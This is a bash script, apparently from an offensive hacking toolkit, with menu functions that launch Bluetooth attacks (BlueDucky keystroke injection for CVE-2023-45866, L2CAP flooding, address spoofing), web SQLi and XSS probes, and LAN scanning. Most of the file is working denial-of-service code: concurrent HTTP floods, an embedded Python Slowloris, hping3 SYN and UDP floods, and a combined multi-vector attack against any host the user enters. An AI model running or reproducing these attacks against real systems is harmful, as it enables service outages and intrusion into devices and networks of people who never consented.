    echo -e "${CYAN}    1)${NC} Flash Marauder firmware"
    echo -e "${CYAN}    2)${NC} Flash Bruce firmware"
    echo -e "${CYAN}    3)${NC} Already flashed - just monitor serial"
    echo -e "${CYAN}    0)${NC} Back"
    echo ""
    read -p "$(echo -e ${YELLOW}'Choice: '${NC})" ADV_CH
    loading_bar "Loading"
    case "$ADV_CH" in
        1)
            local FW="$BASE_DIR/firmware/marauder.bin"
            if [ ! -f "$FW" ]; then
                echo -e "${YELLOW}[!] $FW not found.${NC}"
                echo -e "${DIM}    Download from https://github.com/justcallmekoko/ESP32Marauder/releases${NC}"
                pause; return
            fi
            sudo esptool.py --port "$PORT" --baud 921600 write_flash 0x0 "$FW"
            ;;
        2)
            local FW="$BASE_DIR/firmware/bruce.bin"
            if [ ! -f "$FW" ]; then
                echo -e "${YELLOW}[!] $FW not found.${NC}"
                echo -e "${DIM}    Download from https://github.com/pr3y/Bruce/releases${NC}"
                pause; return
            fi
            sudo esptool.py --port "$PORT" --baud 921600 write_flash 0x0 "$FW"
            ;;
        3)
            echo -e "${CYAN}[*] Serial monitor on $PORT. Ctrl+C to exit.${NC}"
            ensure_tool screen
            sudo screen "$PORT" 115200
            ;;
    esac
    pause
}

bt_blueducky() {
    print_banner
    echo -e "${BOLD}${MAGENTA}========= BLUEDUCKY (CVE-2023-45866) =========${NC}"
    if [ ! -d "$HOME/BlueDucky" ] && [ ! -d $HOME/BlueDucky ]; then
        echo -e "${RED}[!] BlueDucky not installed.${NC}"
        echo -e "${DIM}    git clone https://github.com/eirkkk/BlueDucky-In-NetHunter ~/BlueDucky${NC}"
        pause; return
    fi
    local dir="$HOME/BlueDucky"
    [ -d $HOME/BlueDucky ] && dir="$HOME/BlueDucky"
    echo -e "${YELLOW}[!] Requires CSR 4.0 Bluetooth adapter.${NC}"
    echo -e "${YELLOW}[!] Realtek RTL8761/IMC Networks will fail.${NC}"
    echo ""
    read -p "$(echo -e ${YELLOW}'Target MAC: '${NC})" BT_MAC
    [ -z "$BT_MAC" ] && pause && return
    read -p "$(echo -e ${YELLOW}'Payload file [payload.txt]: '${NC})" BT_PAY
    BT_PAY="${BT_PAY:-payload.txt}"
    echo ""
    echo -e "${CYAN}[*] Running BlueDucky against $BT_MAC...${NC}"
    cd "$dir" || { pause; return; }
    sudo python3 BluetoothDucky.py -i hci0 -k "$BT_MAC" -c "$BT_PAY"
    pause
}

bt_bluetoolkit() {
    print_banner
    echo -e "${BOLD}${MAGENTA}========= BLUETOOLKIT =========${NC}"
    if [ ! -d $HOME/BlueToolkit ] && [ ! -d "$HOME/BlueToolkit" ]; then
        echo -e "${RED}[!] BlueToolkit not installed.${NC}"
        echo -e "${DIM}    git clone https://github.com/sgxgsx/BlueToolkit ~/BlueToolkit${NC}"
        pause; return
    fi
    local dir="$HOME/BlueToolkit"
    [ -d $HOME/BlueToolkit ] && dir="$HOME/BlueToolkit"
    [ -d "$HOME/BlueToolkit" ] && dir="$HOME/BlueToolkit"
    cd "$dir" || { pause; return; }
    echo -e "${CYAN}[*] 1) List exploits  2) Recon target  3) Check connectivity${NC}"
    read -p "$(echo -e ${YELLOW}'Choice: '${NC})" BT_CH
    loading_bar "Loading"
    case "$BT_CH" in
        1) sudo python3 bluekit.py -l ;;
        2) read -p "$(echo -e ${YELLOW}'Target MAC: '${NC})" BT_MAC; [ -n "$BT_MAC" ] && sudo python3 bluekit.py -t "$BT_MAC" -r ;;
        3) read -p "$(echo -e ${YELLOW}'Target MAC: '${NC})" BT_MAC; [ -n "$BT_MAC" ] && sudo python3 bluekit.py -t "$BT_MAC" -ct ;;
    esac
    pause
}

bt_l2flood_dir() {
    print_banner
    echo -e "${BOLD}${RED}========= L2FLOOD =========${NC}"

    local dir="$HOME/l2flood"

    if [ ! -d "$dir" ]; then
        echo -e "${YELLOW}[!] l2flood not found. Installing...${NC}"
        git clone https://github.com/BlackArch/l2flood "$dir" 2>&1 | tail -3
        if [ ! -d "$dir" ]; then
            echo -e "${RED}[!] Clone failed. Falling back to built-in L2CAP flood.${NC}"
            sleep 2; bt_l2cap_flood; return
        fi
        echo -e "${GREEN}[+] Cloned to $dir${NC}"
    fi

    cd "$dir" || { pause; return; }

    if [ -f Makefile ] && [ ! -x l2flood ]; then
        echo -e "${CYAN}[*] Building l2flood...${NC}"
        make 2>&1 | tail -3
    fi

    if [ ! -x ./l2flood ]; then
        echo -e "${YELLOW}[!] Binary not found. Falling back to built-in L2CAP flood.${NC}"
        sleep 2; bt_l2cap_flood; return
    fi

    bt_pick_target
    [ -z "$BT_MAC" ] && pause && return

    local IF="hci0"
    for x in /sys/class/bluetooth/hci*; do
        [ -e "$x" ] || continue
        IF="$(basename "$x")"
        break
    done

    read -p "$(echo -e ${YELLOW}"Interface [$IF]: "${NC})" L2_IF
    L2_IF="${L2_IF:-$IF}"

    read -p "$(echo -e ${YELLOW}'Threads [10]: '${NC})" L2_TH
    L2_TH="${L2_TH:-10}"

    echo ""
    bt_show_target
    echo -e "${CYAN}[*] Running l2flood on $L2_IF, $L2_TH threads, target $BT_MAC...${NC}"
    echo -e "${DIM}    Ctrl+C here to stop.${NC}"
    echo ""
    sudo ./l2flood -i "$L2_IF" -t "$L2_TH" "$BT_MAC"
    echo ""
    echo -e "${GREEN}[+] Done.${NC}"
    pause
}

bt_bdadr_change() {
    print_banner
    echo -e "${BOLD}${MAGENTA}========= BD_ADDR CHANGE =========${NC}"
    echo -e "${YELLOW}[!] Only CSR 4.0 dongles support this.${NC}"
    echo -e "${DIM}    Your IMC Networks RTL8761 will refuse.${NC}"
    echo ""
    bt_pick_iface
    read -p "$(echo -e ${YELLOW}"Adapter (hci0/hci1) [$BT_IF]: "${NC})" ADA
    ADA="${ADA:-$BT_IF}"
    read -p "$(echo -e ${YELLOW}'New MAC (XX:XX:XX:XX:XX:XX): '${NC})" NEW_MAC
    [ -z "$NEW_MAC" ] && pause && return
    sudo bdaddr "$ADA" "$NEW_MAC"
    pause
}
# ===============================================================
# LOCAL NETWORK — device discovery + exploit suggestions
# ===============================================================

lan_ensure_tools() {
    ensure_tool nmap
    ensure_tool arp-scan
    ensure_tool curl
    ensure_tool netcat
}

# guess OS family from open ports

# ===============================================================
# Device history + naming
# ===============================================================

LAN_HISTORY="$BASE_DIR/lan_history.txt"

# fingerprint: read the vendor from MAC OUI. Returns a "PC (Dell)", "iPhone", etc.

# Fills in OS + device-type guess from ports + hostname + MAC vendor

# ===============================================================
# STANDALONE DNS SPOOFING (ARP-based MITM)
# ===============================================================

# ===============================================================
# DNS SPOOFING for evil twin portals
# ===============================================================

ensure_web_tools() {
    ensure_tool curl
    ensure_tool whatweb
    ensure_tool nikto
    ensure_tool nmap
    ensure_tool sqlmap
    ensure_tool hping3
}

web_ask_target() {
    echo ""
    echo -e "${BOLD}${CYAN}--------- TARGET ---------${NC}"
    echo -e "  ${GREEN}[1]${NC}  Enter manually"
    echo -e "  ${GREEN}[2]${NC}  Discover on local network"
    read -p "$(echo -e ${YELLOW}'Choice [1]: '${NC})" WEB_SRC
    WEB_SRC="${WEB_SRC:-1}"

    if [ "$WEB_SRC" = "2" ]; then
        if lan_pick_target "WEB TARGET"; then
            WEB_INPUT="$LAN_TARGET_IP"
        else
            echo -e "${DIM}    Cancelled.${NC}"
            return 1
        fi
    else
        read -p "$(echo -e ${YELLOW}'Domain / IP / URL: '${NC})" WEB_INPUT
    fi
    [ -z "$WEB_INPUT" ] && { echo -e "${YELLOW}[!] Empty.${NC}"; return 1; }
    WEB_SCHEME="http"
    case "$WEB_INPUT" in
        https://*) WEB_SCHEME="https"; WEB_INPUT="${WEB_INPUT#https://}" ;;
        http://*)  WEB_SCHEME="http";  WEB_INPUT="${WEB_INPUT#http://}" ;;
    esac
    WEB_INPUT="${WEB_INPUT%%/*}"
    if [[ "$WEB_INPUT" == *:* ]]; then
        WEB_HOST="${WEB_INPUT%%:*}"
        WEB_PORT="${WEB_INPUT##*:}"
    else
        WEB_HOST="$WEB_INPUT"
        if [ "$WEB_SCHEME" = "https" ]; then WEB_PORT=443; else WEB_PORT=80; fi
    fi
    [ -z "$WEB_HOST" ] && { echo -e "${RED}[!] No host.${NC}"; return 1; }
    local is_ip=0
    if [[ "$WEB_HOST" =~ ^[0-9]{1,3}(\.[0-9]{1,3}){3}$ ]]; then
        is_ip=1
        local o
        for o in ${WEB_HOST//./ }; do
            if [ "$o" -gt 255 ]; then echo -e "${RED}[!] Invalid IP: $WEB_HOST${NC}"; return 1; fi
        done
    fi
    if [ "$is_ip" = "0" ]; then
        if ! echo "$WEB_HOST" | grep -qE '^([a-zA-Z0-9]([a-zA-Z0-9-]{0,61}[a-zA-Z0-9])?\.)+[a-zA-Z]{2,}$'; then
            echo -e "${RED}[!] Invalid domain or IP: $WEB_HOST${NC}"; return 1
        fi
        echo -e "${CYAN}[*] Resolving $WEB_HOST...${NC}"
        if ! getent hosts "$WEB_HOST" >/dev/null 2>&1 && ! nslookup "$WEB_HOST" >/dev/null 2>&1; then
            echo -e "${RED}[!] Does not resolve: $WEB_HOST${NC}"; return 1
        fi
        echo -e "${GREEN}[+] Resolved.${NC}"
    fi
    WEB_TARGET="${WEB_SCHEME}://${WEB_HOST}:${WEB_PORT}"
    echo -e "${GREEN}[+] Target: $WEB_TARGET${NC}"
    return 0
}

web_is_live() {
    local code
    code=$(curl -s -o /dev/null -w "%{http_code}" --max-time 5 "${1}://${2}:${3}/" 2>/dev/null)
    case "$code" in 2*|3*|4*|5*) return 0 ;; *) return 1 ;; esac
}

menu_web() {
    trap on_interrupt INT
    while true; do
        print_banner
        echo -e "${BOLD}${WHITE}=========== WEBSITE / DoS ===========${NC}"
        echo -e "  ${GREEN}[1]${NC}  ${CYAN}Scan & Exploit${NC}"
        echo -e "  ${GREEN}[2]${NC}  ${RED}Denial of Service${NC}"
        echo -e "  ${RED}[0]${NC}  Back"
        echo -e "${BOLD}${WHITE}=====================================${NC}"
        read -p "$(echo -e ${BOLD}${YELLOW}'Choice: '${NC})" WC
        case "$WC" in
            1) menu_web_scan ;;
            2) menu_web_dos ;;
            0) return ;;
            *) sleep 1 ;;
        esac
    done
}

web_recon() {
    print_banner
    echo -e "${BOLD}${CYAN}========= WEB RECON =========${NC}"
    web_ask_target || { pause; return; }
    web_is_live "$WEB_SCHEME" "$WEB_HOST" "$WEB_PORT" || {
        read -p "$(echo -e ${YELLOW}'Not responding. Continue? [y/N]: '${NC})" GO
        [ "$GO" != "y" ] && [ "$GO" != "Y" ] && { pause; return; }
    }
    ensure_web_tools
    whatweb -a 3 "$WEB_TARGET" 2>/dev/null | tee "$LOGS_DIR/web_whatweb_${WEB_HOST}.txt"
    echo ""
    curl -sI "$WEB_TARGET" 2>/dev/null | tee "$LOGS_DIR/web_headers_${WEB_HOST}.txt"
    echo ""
    local f
    for f in robots.txt sitemap.xml .well-known/security.txt; do
        local code
        code=$(curl -s -o /dev/null -w "%{http_code}" "$WEB_TARGET/$f" 2>/dev/null)
        printf "  %-40s  %s\n" "/$f" "$code"
    done
    echo ""
    sudo nmap -Pn -p 80,443,8080,8443 --open -T4 "$WEB_HOST" 2>/dev/null | grep -E "^(PORT|[0-9]+/|Nmap)"
    pause
}

web_nikto() {
    print_banner
    echo -e "${BOLD}${CYAN}========= NIKTO =========${NC}"
    web_ask_target || { pause; return; }
    ensure_tool nikto
    nikto -h "$WEB_TARGET" -output "$LOGS_DIR/nikto_${WEB_HOST}.txt" -Format txt 2>&1 | tail -40
    pause
}

web_sqli_check() {
    print_banner
    echo -e "${BOLD}${RED}========= SQL INJECTION =========${NC}"
    web_ask_target || { pause; return; }
    ensure_tool sqlmap
    ensure_tool curl
    read -p "$(echo -e ${YELLOW}'Full URL with params: '${NC})" SQL_URL
    [ -z "$SQL_URL" ] && pause && return
    local base_len inj_len
    base_len=$(curl -s -o /dev/null -w "%{size_download}" "$SQL_URL" 2>/dev/null)
    echo -e "  Baseline size: $base_len"
    inj_len=$(curl -s -o /dev/null -w "%{size_download}" "${SQL_URL}'" 2>/dev/null)
    echo -e "  Size after ': $inj_len"
    if [ "$base_len" != "$inj_len" ]; then
        echo -e "${RED}[!] Response changed — possible SQLi${NC}"
        read -p "$(echo -e ${BOLD}${YELLOW}'Run full sqlmap scan? [y/N]: '${NC})" RUNSQL
        if [ "$RUNSQL" = "y" ] || [ "$RUNSQL" = "Y" ]; then
            sqlmap -u "$SQL_URL" --batch --level=2 --risk=2 --random-agent \
                --output-dir="$LOGS_DIR/sqlmap_${WEB_HOST}" 2>&1 | tail -80
        fi
    else
        echo -e "${GREEN}[+] No size change from quote.${NC}"
    fi
    pause
}

web_xss_probe() {
    print_banner
    echo -e "${BOLD}${YELLOW}========= XSS PROBE =========${NC}"
    web_ask_target || { pause; return; }
    read -p "$(echo -e ${YELLOW}'URL with param: '${NC})" XSS_URL
    [ -z "$XSS_URL" ] && pause && return
    local param
    param=$(echo "$XSS_URL" | grep -oE '[?&][^=&]+=' | head -1 | tr -d '?&=')
    [ -z "$param" ] && { echo -e "${RED}[!] No param found.${NC}"; pause; return; }
    local encoded='%3Cscript%3Ealert(1)%3C%2Fscript%3E'
    local test_url
    test_url=$(echo "$XSS_URL" | sed "s|$param=[^&]*|$param=$encoded|")
    local resp
    resp=$(curl -s "$test_url" 2>/dev/null)
    if echo "$resp" | grep -qF '<script>alert(1)</script>'; then
        echo -e "${RED}[!] REFLECTED UNENCODED — XSS likely${NC}"
        read -p "$(echo -e ${BOLD}${YELLOW}'Open in browser? [y/N]: '${NC})" OPENB
        [ "$OPENB" = "y" ] || [ "$OPENB" = "Y" ] && xdg-open "$test_url" >/dev/null 2>&1 &
    else
        echo -e "${GREEN}[+] Likely safe (payload not reflected raw).${NC}"
    fi
    echo "$resp" > "$LOGS_DIR/xss_${WEB_HOST}.html"
    pause
}

web_nuclei_scan() {
    print_banner
    echo -e "${BOLD}${MAGENTA}========= NUCLEI =========${NC}"
    web_ask_target || { pause; return; }
    ensure_tool nuclei
    nuclei -u "$WEB_TARGET" -o "$LOGS_DIR/nuclei_${WEB_HOST}.txt" -silent 2>&1 | tail -40
    pause
}

dos_ask_target() {
    web_ask_target || return 1
    web_is_live "$WEB_SCHEME" "$WEB_HOST" "$WEB_PORT" || {
        read -p "$(echo -e ${YELLOW}'Not responding. Continue? [y/N]: '${NC})" GO
        [ "$GO" != "y" ] && [ "$GO" != "Y" ] && return 1
    }
    read -p "$(echo -e ${YELLOW}'Duration (sec) [30]: '${NC})" DOS_TIME
    DOS_TIME="${DOS_TIME:-30}"
    echo ""
    echo -e "${RED}== Heavy traffic -> $WEB_HOST:$WEB_PORT for $DOS_TIME s =="${NC}
    read -p "$(echo -e ${BOLD}${YELLOW}'Confirm? [y/N]: '${NC})" CONFIRM
    [ "$CONFIRM" != "y" ] && [ "$CONFIRM" != "Y" ] && { echo -e "${DIM}Aborted.${NC}"; return 1; }
    return 0
}

dos_http_flood() {
    print_banner
    echo -e "${BOLD}${CYAN}========= HTTP FLOOD =========${NC}"
    dos_ask_target || { pause; return; }
    local end=$(($(date +%s) + DOS_TIME))
    local start=$(date +%s)
    rm -f /tmp/dos_http_*
    for i in $(seq 1 20); do
        ( local s=0
          while [ "$(date +%s)" -lt "$end" ]; do
            curl -s -o /dev/null --max-time 5 "${WEB_SCHEME}://${WEB_HOST}:${WEB_PORT}/" 2>/dev/null
            s=$((s+1)); echo $s > "/tmp/dos_http_$i"
          done ) &
    done
    while [ "$(date +%s)" -lt "$end" ]; do
        local elapsed=$(( $(date +%s) - start ))
        local total=0
        for f in /tmp/dos_http_*; do [ -f "$f" ] && total=$((total + $(cat "$f" 2>/dev/null))); done
        printf "\r${CYAN}[%3d%%]${NC}  %ds left | %d requests   " \
            $((elapsed * 100 / DOS_TIME)) $((DOS_TIME - elapsed)) "$total"
        sleep 1
    done
    echo ""
    wait 2>/dev/null
    rm -f /tmp/dos_http_*
    echo -e "${GREEN}[+] Done.${NC}"
    pause
}

dos_slowloris() {
    print_banner
    echo -e "${BOLD}${CYAN}========= SLOWLORIS =========${NC}"
    dos_ask_target || { pause; return; }
    python3 - "$WEB_HOST" "$WEB_PORT" "$DOS_TIME" <<'PYEOF'
import socket, sys, time, threading
host, port, dur = sys.argv[1], int(sys.argv[2]), int(sys.argv[3])
stop = time.time() + dur
socks = []
def open_one():
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM); s.settimeout(4)
        s.connect((host, port))
        s.send(b"GET / HTTP/1.1\r\nHost: " + host.encode() + b"\r\n")
        return s
    except Exception: return None
def worker():
    while time.time() < stop:
        s = open_one()
        if s: socks.append(s)
        time.sleep(0.05)
[threading.Thread(target=worker, daemon=True).start() for _ in range(30)]
while time.time() < stop:
    print(f"\r\x1b[1;36m[*]\x1b[0m  {int(stop-time.time())}s | {len(socks)} conns   ", end="")
    for s in list(socks):
        try: s.send(b"X-a: b\r\n")
        except Exception:
            try: socks.remove(s)
            except: pass
    time.sleep(1)
for s in socks:
    try: s.close()
    except: pass
print("\n\x1b[1;32m[+] Done.\x1b[0m")
PYEOF
    pause
}

dos_syn_flood() {
    print_banner
    echo -e "${BOLD}${CYAN}========= SYN FLOOD =========${NC}"
    dos_ask_target || { pause; return; }
    command -v hping3 >/dev/null 2>&1 || sudo apt install -y hping3 2>&1 | tail -3
    sudo timeout "$DOS_TIME" hping3 -S --flood -p "$WEB_PORT" "$WEB_HOST" 2>&1 | tail -12
    pause
}

dos_udp_flood() {
    print_banner
    echo -e "${BOLD}${CYAN}========= UDP FLOOD =========${NC}"
    dos_ask_target || { pause; return; }
    command -v hping3 >/dev/null 2>&1 || sudo apt install -y hping3 2>&1 | tail -3
    sudo timeout "$DOS_TIME" hping3 --udp --flood -p "$WEB_PORT" "$WEB_HOST" 2>&1 | tail -10
    pause
}

dos_multi() {
    print_banner
    echo -e "${BOLD}${RED}========= MULTI-VECTOR =========${NC}"
    dos_ask_target || { pause; return; }
    local end=$(($(date +%s) + DOS_TIME))
    local start=$(date +%s)
    for i in $(seq 1 10); do
        ( while [ "$(date +%s)" -lt "$end" ]; do
            curl -s -o /dev/null --max-time 5 "${WEB_SCHEME}://${WEB_HOST}:${WEB_PORT}/" 2>/dev/null
          done ) &
    done
    python3 - "$WEB_HOST" "$WEB_PORT" "$DOS_TIME" >/dev/null 2>&1 <<'PYEOF' &
import socket, sys, time
host, port, dur = sys.argv[1], int(sys.argv[2]), int(sys.argv[3])
stop = time.time() + dur
socks = []
while time.time() < stop:
    for _ in range(3):
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM); s.settimeout(4)
            s.connect((host, port))
            s.send(b"GET / HTTP/1.1\r\nHost: " + host.encode() + b"\r\n")
            socks.append(s)
        except Exception: pass
    for s in list(socks):
        try: s.send(b"X-a: b\r\n")
        except Exception:
            try: socks.remove(s)
            except: pass
    time.sleep(0.5)
for s in socks:
    try: s.close()
    except: pass
PYEOF
    if command -v hping3 >/dev/null 2>&1; then
        sudo timeout "$DOS_TIME" hping3 -S --flood -p "$WEB_PORT" "$WEB_HOST" >/dev/null 2>&1 &
    fi
    while [ "$(date +%s)" -lt "$end" ]; do
        local elapsed=$(( $(date +%s) - start ))
        printf "\r${CYAN}[%3d%%]${NC}  multi-vector | %ds left   " \
            $((elapsed * 100 / DOS_TIME)) $((DOS_TIME - elapsed))
        sleep 1
    done
    echo ""
    wait 2>/dev/null
    echo -e "${GREEN}[+] Done.${NC}"
    pause
}

# ===============================================================
# LOCAL NETWORK — device discovery + exploit suggestions
# ===============================================================

lan_ensure_tools() {
    ensure_tool nmap
    ensure_tool arp-scan
    ensure_tool curl
    ensure_tool netcat
}

lan_get_my_net() {
    # use explicit arg first, then the saved $LAN_IFACE, then auto-detect
    local iface="$1"
    [ -z "$iface" ] && [ -n "$LAN_IFACE" ] && iface="$LAN_IFACE"

    if [ -n "$iface" ] && ip -4 addr show "$iface" >/dev/null 2>&1 && \
       ip -4 addr show "$iface" 2>/dev/null | grep -q 'inet '; then
        :
    else
        # prefer wlan0 if it has an IP
        if ip -4 addr show wlan0 2>/dev/null | grep -q 'inet '; then
            iface="wlan0"
        elif ip -4 addr show eth0 2>/dev/null | grep -q 'inet '; then
            iface="eth0"
        else
            iface=$(ip -4 -o addr show 2>/dev/null | awk '$2!="lo" && $3=="inet" {print $2; exit}')
        fi
    fi
    [ -z "$iface" ] && { echo ""; return 1; }
    local cidr
    cidr=$(ip -4 -o addr show "$iface" 2>/dev/null | awk '{print $4}' | head -1)
    [ -z "$cidr" ] && { echo ""; return 1; }
    echo "$iface|$cidr"
    return 0
}

lan_scan_hosts() {
    print_banner
    echo -e "${BOLD}${CYAN}========= LAN HOST DISCOVERY =========${NC}"
    lan_ensure_tools

    local netinfo
    netinfo=$(lan_get_my_net "wlan0") || { echo -e "${RED}[!] No active network interface.${NC}"; pause; return; }
    local iface="${netinfo%%|*}"
    local cidr="${netinfo##*|}"
    local net="${cidr%/*}"
    local prefix="${cidr#*/}"

    echo -e "${GREEN}[+] Interface: $iface${NC}"
    echo -e "${GREEN}[+] CIDR:      $cidr${NC}"
    echo ""
    read -p "$(echo -e ${YELLOW}"Subnet to scan [$net/$prefix]: "${NC})" TARGET_SUB
    TARGET_SUB="${TARGET_SUB:-$net/$prefix}"
    echo ""
    echo -e "${CYAN}[*] Running arp-scan first (fast, layer 2)...${NC}"
    sudo arp-scan --interface="$iface" --localnet 2>/dev/null | tee "$LOGS_DIR/lan_arpscan_$(date +%s).txt" | tail -40
    echo ""

    echo -e "${CYAN}[*] Running nmap ping sweep + OS fingerprint (may take 1-2 min)...${NC}"
    local outfile="$LOGS_DIR/lan_nmap_$(date +%s).txt"
    sudo nmap -sn "$TARGET_SUB" -oG - 2>/dev/null | awk '/Up$/{print $2}' > /tmp/lan_hosts.txt
    local n
    n=$(wc -l < /tmp/lan_hosts.txt)
    echo -e "${GREEN}[+] Found $n live hosts${NC}"
    echo ""

    LAN_HOSTS=()
    local i=1
    printf "${BOLD}%-4s %-18s %-22s %s${NC}\n" "No." "IP" "MAC" "HOSTNAME"
    echo -e "${CYAN}------------------------------------------------------------${NC}"
    while read -r ip; do
        [ -z "$ip" ] && continue
        local mac host
        mac=$(ip neigh show "$ip" 2>/dev/null | awk '{print $5}' | head -1)
        [ -z "$mac" ] && mac="(unknown)"
        host=$(getent hosts "$ip" | awk '{print $2}' | head -1)
        [ -z "$host" ] && host="-"
        printf "${BOLD}%-4s${NC} ${YELLOW}%-18s${NC} ${CYAN}%-22s${NC} ${GREEN}%s${NC}\n" "$i" "$ip" "$mac" "$host"
        LAN_HOSTS[$i]="$ip"
        i=$((i+1))
    done < /tmp/lan_hosts.txt

    if [ ${#LAN_HOSTS[@]} -eq 0 ]; then
        echo -e "${YELLOW}[!] No hosts found. Check you're on the right network.${NC}"
    fi
    echo ""
    echo -e "${GREEN}[+] Full report: $outfile${NC}"
    pause
}

lan_scan_host_ports() {
    print_banner
    echo -e "${BOLD}${CYAN}========= PORT SCAN (single host) =========${NC}"
    lan_ensure_tools

    echo -e "${DIM}    Enter the target IP you want to scan.${NC}"
    read -p "$(echo -e ${YELLOW}'Target IP: '${NC})" LAN_IP
    [ -z "$LAN_IP" ] && pause && return

    # quick check
    if ! ping -c 1 -W 2 "$LAN_IP" >/dev/null 2>&1; then
        echo -e "${YELLOW}[!] No ICMP reply. Continue anyway? Some hosts block ping.${NC}"
        read -p "$(echo -e ${YELLOW}'[y/N]: '${NC})" GO
        [ "$GO" != "y" ] && [ "$GO" != "Y" ] && { pause; return; }
    fi

    echo ""
    echo -e "${BOLD}${CYAN}--- SCAN MODE ---${NC}"
    echo -e "  ${GREEN}[1]${NC} Top 1000 ports (fast)"
    echo -e "  ${GREEN}[2]${NC} Top 10000 ports (medium)"
    echo -e "  ${GREEN}[3]${NC} All 65535 ports (slow, -p-)"
    echo -e "  ${GREEN}[4]${NC} Service version + OS detect (-sV -O)"
    echo -e "  ${GREEN}[5]${NC} Vulnerability scripts (--script vuln)"
    read -p "$(echo -e ${YELLOW}'Choice [1]: '${NC})" MODE
    MODE="${MODE:-1}"

    local outfile="$LOGS_DIR/lan_portscan_${LAN_IP}_$(date +%s).txt"
    echo ""
    case "$MODE" in
        1) sudo nmap -Pn -T4 --top-ports 1000 "$LAN_IP" -oN "$outfile" ;;
        2) sudo nmap -Pn -T4 --top-ports 10000 "$LAN_IP" -oN "$outfile" ;;
        3) sudo nmap -Pn -T4 -p- "$LAN_IP" -oN "$outfile" ;;
        4) sudo nmap -Pn -T4 -sV -O "$LAN_IP" -oN "$outfile" ;;
        5) sudo nmap -Pn -T4 --script vuln "$LAN_IP" -oN "$outfile" ;;
    esac
    echo ""
    echo -e "${GREEN}[+] Report: $outfile${NC}"
    pause
}

# guess OS family from open ports
lan_guess_os() {
    local ip="$1"
    local ports
    ports=$(sudo nmap -Pn -T4 --top-ports 200 "$ip" 2>/dev/null | awk '/^[0-9]+\//{print $1}' | tr -d '/tcp')
    local guess="Unknown device"
    # heuristics
    if echo "$ports" | grep -qE '^(5353|62078)$'; then
        guess="Apple device (iPhone / iPad / Mac)"
    elif echo "$ports" | grep -qE '^(445|139|3389)$'; then
        guess="Windows PC"
    elif echo "$ports" | grep -qE '^(5555|5037|8080)$'; then
        guess="Android device (ADB / dev port open)"
    elif echo "$ports" | grep -qE '^(9100|631)$'; then
        guess="Printer"
    elif echo "$ports" | grep -qE '^(22|80|443|3306|5432)$'; then
        guess="Linux server / web host"
    elif echo "$ports" | grep -qE '^(554|8554)$'; then
        guess="IP camera / RTSP"
    elif echo "$ports" | grep -qE '^(1900|5000)$'; then
        guess="UPnP / IoT device"
    fi
    echo "$guess|$ports"
}

lan_find_hidden() {
    print_banner
    echo -e "${BOLD}${MAGENTA}========= FIND HIDDEN WI-FI NETWORKS =========${NC}"
    echo -e "${DIM}    Networks that don't broadcast their name.${NC}"
    echo ""
    ensure_tool airodump-ng aircrack-ng
    local mon_iface=""
    if iw dev wlan0mon info >/dev/null 2>&1; then
        mon_iface="wlan0mon"
    elif iw dev wlan0 info >/dev/null 2>&1; then
        echo -e "${CYAN}[*] Switching wlan0 to monitor mode...${NC}"
        sudo systemctl stop NetworkManager >/dev/null 2>&1
        sudo ip link set wlan0 down >/dev/null 2>&1
        sudo iw wlan0 set type monitor >/dev/null 2>&1
        sudo ip link set wlan0 up >/dev/null 2>&1
        sleep 2
        if iw dev wlan0 info | grep -q "type monitor"; then
            mon_iface="wlan0"
        else
            echo -e "${RED}[!] Failed to enter monitor mode.${NC}"
            sudo ip link set wlan0 up >/dev/null 2>&1
            sudo systemctl start NetworkManager >/dev/null 2>&1
            pause; return
        fi
    else
        echo -e "${RED}[!] No wireless interface.${NC}"
        pause; return
    fi
    echo -e "${GREEN}[+] Using $mon_iface${NC}"
    echo -e "${CYAN}[*] Scanning 15 seconds...${NC}"
    echo ""
    sudo rm -f /tmp/hidden_scan-01.csv
    sudo timeout 15 airodump-ng "$mon_iface" --band abg --output-format csv -w /tmp/hidden_scan >/dev/null 2>&1
    local csv="/tmp/hidden_scan-01.csv"
    if [ ! -f "$csv" ]; then
        echo -e "${YELLOW}[!] Scan produced no output.${NC}"
    else
        echo -e "${BOLD}${MAGENTA}--- HIDDEN NETWORKS ---${NC}"
        echo ""
        local count=0
        local IFS=','
        while read -r bssid first seen channel speed privacy cipher auth power beacons ivs lanip idlen essid rest; do
            bssid=$(echo "$bssid" | tr -d ' "')
            essid=$(echo "$essid" | tr -d ' "')
            power=$(echo "$power" | tr -d ' ')
            channel=$(echo "$channel" | tr -d ' ')
            [[ ! "$bssid" =~ ^([0-9A-Fa-f]{2}:){5}[0-9A-Fa-f]{2}$ ]] && continue
            if [ -z "$essid" ]; then
                count=$((count+1))
                printf "  ${RED}[hidden]${NC} BSSID: ${YELLOW}%s${NC}  CH: ${CYAN}%s${NC}  PWR: ${GREEN}%s${NC}\n" \
                    "$bssid" "$channel" "$power"
            fi
        done < "$csv"
        echo ""
        if [ $count -eq 0 ]; then
            echo -e "  ${GREEN}[+] No hidden networks in range.${NC}"
        else
            echo -e "  ${BOLD}Total: $count hidden networks${NC}"
        fi
    fi
    unset IFS
    if [ "$mon_iface" = "wlan0" ]; then
        echo ""
        echo -e "${CYAN}[*] Restoring wlan0...${NC}"
        sudo ip link set wlan0 down >/dev/null 2>&1
        sudo iw wlan0 set type managed >/dev/null 2>&1
        sudo ip link set wlan0 up >/dev/null 2>&1
        sudo systemctl start NetworkManager >/dev/null 2>&1
        sudo dhclient wlan0 >/dev/null 2>&1 &
    fi
    echo -e "${GREEN}[+] Done.${NC}"
    pause
}

lan_device_menu() {
    print_banner
    echo -e "${BOLD}${CYAN}========= DEVICE SELECT =========${NC}"

    if [ ${#LAN_HOSTS[@]} -eq 0 ]; then
        echo -e "${YELLOW}[!] No devices scanned yet.${NC}"
        read -p "$(echo -e ${YELLOW}'Scan now? [y/N]: '${NC})" DO
        [ "$DO" = "y" ] || [ "$DO" = "Y" ] && lan_scan_hosts || return
    fi

    echo ""
    printf "${BOLD}%-4s %-18s %s${NC}\n" "No." "IP" "GUESS"
    echo -e "${CYAN}---------------------------------------─${NC}"
    local i=1
    while [ $i -le ${#LAN_HOSTS[@]} ]; do
        local ip="${LAN_HOSTS[$i]}"
        [ -z "$ip" ] && { i=$((i+1)); continue; }
        local os_info
        os_info=$(lan_guess_os "$ip")
        local guess="${os_info%%|*}"
        printf "${BOLD}%-4s${NC} ${YELLOW}%-18s${NC} ${GREEN}%s${NC}\n" "$i" "$ip" "$guess"
        eval "LAN_HOST_OS_$i=\"\$guess\""
        i=$((i+1))
    done

    echo ""
    read -p "$(echo -e ${YELLOW}'Pick device number: '${NC})" PICK
    [ -z "$PICK" ] && return
